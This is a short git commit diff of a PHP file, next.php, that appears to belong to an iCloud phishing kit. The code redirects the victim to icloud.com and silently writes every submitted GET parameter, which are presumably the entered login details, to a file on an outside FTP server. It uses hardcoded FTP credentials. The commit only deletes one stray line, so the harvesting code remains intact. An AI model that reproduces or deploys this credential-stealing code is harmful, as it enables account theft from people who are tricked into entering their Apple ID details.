995b1def585d2cc7ada7b9d3ab7985835c036882
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-08-08 16:22:18 -0500

    fin

--- next.php
+++ next.php
@@ -1,3 +1,2 @@
 <?php header("Location:http://www.icloud.com"); $handle = fopen("ftp://icloudpass20:codetek10@ftp.webcindario.com/web/index.html", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n");  
-fwrite ($f, '. [<b><font color="#EE0707">'ok '</font></b>]<br>');
 fclose($handle); exit; ?>
